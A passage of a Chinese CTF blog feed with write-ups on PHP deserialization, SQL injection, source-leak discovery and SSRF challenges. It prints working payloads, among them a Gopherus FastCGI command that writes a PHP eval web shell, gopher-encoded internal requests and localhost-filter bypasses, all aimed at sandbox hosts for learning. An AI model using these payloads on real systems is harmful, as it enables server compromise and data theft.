    <content type="html"><![CDATA[<h2 id="二十四、"><a href="#二十四、" class="headerlink" title="二十四、"></a>二十四、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2020 青龙组]AreUSerialz   </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    </span></code></pre></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一大段代码，很可怕<br>通过<code>read()</code>函数中的<code>file_get_contents</code>和<code>process()</code>函数中的<code> $this-&gt;output($res);</code><br>我们应该利用这个读取到<code>flag.php</code><br>传一个序列化的$str,filename=flag.php,调用read()函数需要op==”2”;而析构函数里有个</p><pre><code>if($this-&gt;op === &quot;2&quot;)     $this-&gt;op = &quot;1&quot;;     </code></pre><p>所以不能使<code>op===&quot;2&quot;</code>成立，运用弱类型让<code>op=2</code>即可          </p><pre><code>function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;    </code></pre><p>这个要求$str的ASCII码必须在32~125之间<br>protected类在序列化后含有%00，其ASCII码为0<br>PHP7.1以上版本对属性类型不敏感，所以可以改成public类绕过       </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token double-quoted-string string">"hello"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>          </code></pre></code></pre><p>payload：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;hello&quot;;&#125;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/7fca77026da21ca9.png">  </p><hr><p>也可以使用伪协议  </p><pre><code>public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;     </code></pre><hr><p>或者<br>不改类型，还是protected<br>将序列化后的字节流中用大写S表示表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，就可以将<code>%00</code>替换为<code>\00</code><br>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;s:5:&quot;hello&quot;;&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题023</title>
    <link href="/2021/02/06/BUU023/"/>
    <url>/2021/02/06/BUU023/</url>
    
    <content type="html"><![CDATA[<h2 id="二十三、"><a href="#二十三、" class="headerlink" title="二十三、"></a>二十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[GXYCTF2019]BabySQli<br><img src="https://ftp.bmp.ovh/imgs/2021/02/882964df2e56c968.png">  </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>name=admin&amp;pw=123</code>———–<code>wrong pass!</code><br><code>name=admin&#39;&amp;pw=123</code>———-<code>报错</code><br><code>name=admin&amp;pw=1&#39;</code>————<code>wrong pass!</code><br>说明<code>name</code>存在注入，<code>pw</code>不存在<br>在<code>search.php</code>页面源码注释中发现：<br><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code><br>base32然后base64解码得到SQL语句<br><code>select * from user where username = &#39;$name&#39;</code><br><code>or、=、(、)</code>被过滤，但OR可以<br><code>admin&#39; Order by 4#</code>———<code>Error: Unknown column &#39;4&#39; in &#39;order clause&#39; </code>说明有三列<br><code>1&#39; union select 1,2,3#</code>看回显位，结果是<code>wrong user!</code><br>将1改为<code>&#39;admin&#39;</code>,还是wrong user；改到第二位，变成了wrong pass，说明admin在第二列       </p><hr><p>在BUU给的这道题的源码中<img src="https://ftp.bmp.ovh/imgs/2021/02/0eafd76c74fd6cb3.png"><br><code>arr[1]==&#39;admin&#39;</code>那么<code>arr[2]</code>应该就是输入的pw吧<br>需要<code>md5($password) == $arr[2]</code><br>所以只要传入的pw的MD5等于第三位就行了 </p><hr><p>如果没有源码的提示，正确的思路应该是利用sql的特性：<code>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</code>     </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code>&amp;&amp;<code>pw=123</code><img src="https://ftp.bmp.ovh/imgs/2021/02/dee35a5c0bf7263c.png">        </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><code>sql特性</code>     </p><blockquote><p><img src="https://ftp.bmp.ovh/imgs/2021/02/0b5f477cb43f3a6c.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/02/0c57b06eb2a85b33.png"></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ctfhub</title>
    <link href="/2021/02/05/ctfhub/"/>
    <url>/2021/02/05/ctfhub/</url>
    
    <content type="html"><![CDATA[<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>打开靶场是这样<br><img src="https://s1.imagehub.cc/images/2021/02/05/01.png" alt="01.png"><br>试出了<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/02/e4a53dc8cc6e31e3.png"><br>差点让我以为是misc。。。。。。。。<br>看wp说是访问该文件名才能得到    <img src="https://s1.imagehub.cc/images/2021/02/05/03.png" alt="03.png">      </p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><ul><li>知识点    <blockquote><p>vim编辑文件会自动生成备份文件以及临时文件<br>临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为  <code>.filename.swp，</code>（第一次产生的交换文件名为<code>.filename.txt.swp</code>；再次意外退出后，将会产生名为<code>.filename.txt.swo</code>的交换文件；而第三次产生的交换文件则为<code>.filename.txt.swn</code>）      </p></blockquote></li></ul><p><img src="https://s1.imagehub.cc/images/2021/02/05/04.png" alt="04.png"><br>根据提示，访问<code>.index.php.swp</code>得到文件       </p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><ul><li>知识点   <blockquote><p><code>.DS_Store</code>是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<code>.DS_Store</code>可以知道这个目录里面所有文件的清单。</p></blockquote></li></ul><p>得到文件后用记事本打开，notepad会有许多<code>NULL</code>      </p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>根据提示用<a href="https://blog.csdn.net/qq_44841017/article/details/105733100">githack</a><br><code>python GitHack.py http://challenge-01d55127514c37b5.sandbox.ctfhub.com:10080/.git/</code>需要注意的是，githack需要在python2下运行kali默认python是2.x,如需更换运行命令<code>alias python=’/usr/bin/python3’</code>这只是暂时的，重新开启终端会还原 <img src="https://ftp.bmp.ovh/imgs/2021/02/723886d5344eeed7.png"><br><code>git log</code>查看提交commit history<img src="https://ftp.bmp.ovh/imgs/2021/02/c0eb6c8ca5a7bde7.png"><br><code>git diff</code>比较文件的不同，即比较文件在暂存区和工作区的差异。<br><img src="https://ftp.bmp.ovh/imgs/2021/02/e469825c9cdfb249.png"><br>或者直接<code>git log -p</code>也可<a href="https://blog.csdn.net/jjlovefj/article/details/86476925">more</a></p><h3 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/0a4ff12cf20d5d8c.png"> </p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/71d91a8d826e6a27.png"><br><img src="https://ae02.alicdn.com/kf/H4a3d4c7743ad4c14aa8436a33fcd3867E.jpg" alt="206.png">      </p><h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p><img src="https://ae04.alicdn.com/kf/H4a82f10c66a441eb88e7f4605de8a5fc4.jpg" alt="301.png"><br>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><p>需要用到一个工具<code>https://github.com/kost/dvcs-ripper</code>            </p><ul><li>安装 ：<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code>     </li><li>下载：<code>git clone https://github.com/kost/dvcs-ripper</code>       </li><li>进入目录—-<code>./rip-svn.pl -v -u http://challenge-05b7bb06a8d52597.sandbox.ctfhub.com:10080/.svn/</code><br><img src="https://ae02.alicdn.com/kf/H29c34143c01d4d5d8e779d0e2486633bO.jpg" alt="302.png"><br>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份<img src="https://sc02.alicdn.com/kf/He5b38923481e44aa991f5d9a8af4c606r.jpg" alt="303.png">     <h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。<br>使用<code>dvcs-ripper</code>里的<code>rip-hg.pl</code>获取<code>.hg</code><br><img src="https://ae03.alicdn.com/kf/H8d9f7059f12149038acda9a79def182fz.jpg" alt="304.png"><br>进入<code>.hg/</code><img src="https://ae04.alicdn.com/kf/H20378cb9f63b45fb87a76966b69ee5b82.jpg" alt="305.png"><br>网页访问得到flag     <h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><img src="https://ae04.alicdn.com/kf/H1008cfe9ce7444b3941d6673d77452d1T.jpg" alt="401.png"><br>百度搜索:<code>常见设备默认口令</code><br>找到亿邮邮件网关的默认用户名和密码—登录<br><a href="https://blog.csdn.net/weixin_40399254/article/details/106469069">常见设备默认口令</a><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3></li></ul><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦          </p><p><img src="https://ae02.alicdn.com/kf/U9aac43ac8c544d01963111fc9be06a91h.jpg" alt="501.png"><br>题目是端口扫描，给了范围，可以用burp爆破<br>抓包<br>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况<br><img src="https://ae04.alicdn.com/kf/Udb8ff8141f11458f8592a495df9dae77Y.jpg" alt="502.png"><br>设置<br><img src="https://ae03.alicdn.com/kf/U237150ace53d40ad8b149c0880bd075bc.jpg" alt="503.png"><br>结果<br><img src="https://ae02.alicdn.com/kf/U2ff238abbe8f47c3906bce8991367077Q.jpg" alt="504.png"><br>访问得到flag      </p><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>尝试访问位于127.0.0.1的flag.php吧         </p><p>payload：<code>url=127.0.0.1/flag.php</code>       </p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>尝试去读取一下Web目录下的flag.php吧        </p><p>题目说是web目录，用file伪协议即可<br>payload：<code>url=file:///var/www/html/flag.php</code><br>web目录要记住          </p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>看wp说能扫出<code>index.php</code>和<code>flag.php</code>的，但我没扫出来<br>直接访问吧<br><code>/flag.php</code>——-&gt;Just View From 127.0.0.1<br>那么<code>?url=127.0.0.1/flag.php</code><img src="https://sc03.alicdn.com/kf/U16e6dcbec9894950bdd8eadca49482ecL.jpg" alt="505.png"><br>可以用file协议读取<code>flag.php</code>        </p><pre><code>&lt;?phperror_reporting(0);if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;    echo &quot;Just View From 127.0.0.1&quot;;    return;&#125;$flag=getenv(&quot;CTFHUB&quot;);$key = md5($flag);if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;    echo $flag;    exit;&#125;?&gt;</code></pre><p>没有提交按钮，可以用gopher协议构造post请求       </p><pre><code>POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36key=308353d55f15e345a78047c613994fcb         </code></pre><p>将其进行url编码，<br>然后加上<code>gopher://127.0.0.1:80/_</code><br>再次url编码<br>提交得到flag<br>payload：<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>这个和上面那个差不多，也要用gopher协议<br>访问flag.php后有上传文件，但没提交按钮<br>可以自己构造一个<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>提交抓包<br>Host改为<code>127.0.0.1</code><br>过一下上面的编码流程<br>提交       </p><h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助   </p><p>这次可以使用<code>Gopherus</code>工具生成攻击fastcgi的payload     </p><pre><code>python gopherus.py --exploit fastcgi/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre><p><a href="https://github.com/tarunkant/gopherus">gopher</a><br><img src="https://sc04.alicdn.com/kf/Ub52af498907e44fcb82b438d02f79f38P.jpg" alt="507.png"><br>因为要以GET传入，所以要再进行一次url编码<br>提交后蚁剑连接即可<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">P神的fsatcgi分析</a>        </p><h3 id="Redia协议"><a href="#Redia协议" class="headerlink" title="Redia协议"></a>Redia协议</h3><p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!     </p><p>Redia也可以用gopherus直接生成payload<br><img src="https://sc01.alicdn.com/kf/U59fa33c2723c4f3899da3f7205a6a573R.jpg" alt="508.png"><br>但这次需要将得到的payload进行两次url编码，不知道为什么，不该是一次么？？        </p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>请求的URL中必须包含<a href="http://notfound.ctfhub.com,来尝试利用url的一些特殊地方绕过这个限制吧/">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p><p><img src="https://ae03.alicdn.com/kf/Ud3002561aaad433d8b3b07518fa317f2i.jpg" alt="509.png"><br><code>@</code><br>payload：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>        </p><h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢      </p><p>转换为十六进制，八进制和十进制貌似不行<br><code>0x7f.0.0.1/flag.php</code>  </p><ul><li>其他指向<code>127.0.0.1</code>的地址    <blockquote><p><a href="http://localhost/">http://localhost/</a><br><a href="http://0.0.0.0/">http://0/</a><br>http://[0:0:0:0:0:ffff:127.0.0.1]/<br>http://①②⑦.⓪.⓪.①      </p></blockquote></li></ul><h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧      </p><p>抱着试试的心态，看会有什么，直接<code>?url=127.0.0.1/flag.php</code><br>居然出了flag？？？？？？？？？         </p><ul><li><code>.xip.io</code>      <blockquote><p>127.0.0.1.xip.io——-&gt;127.0.0.1       </p></blockquote></li><li><a href="https://4m.cn/">短地址绕过</a><br>  <img src="https://ae02.alicdn.com/kf/U322cdf822f2d4381baff23981c4998dbA.jpg" alt="510.png">       </li></ul><h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>这两道题指定是出毛病了<br>直接就出来了？？？？？      </p><p>一个网站获取测试用的域名<code>https://lock.cmpxchg8b.com/rebinder.html</code><br><img src="https://ae03.alicdn.com/kf/Uffcd9a5275694a52a5104eed584e3e4bI.jpg" alt="511.png"><br>这个域名可以在两个IP间变换，所以就有可能在经过判断IP是否合法是解析到合法的那个IP，在其访问时解析到内网IP<br>所以要不断访问<br><img src="https://image.3001.net/images/20201220/1608453315_5fdf0cc30da5af624b123.png"><br><a href="https://zhuanlan.zhihu.com/p/89426041">DNS重绑定</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题022</title>
    <link href="/2021/02/05/BUU022/"/>
    <url>/2021/02/05/BUU022/</url>
    
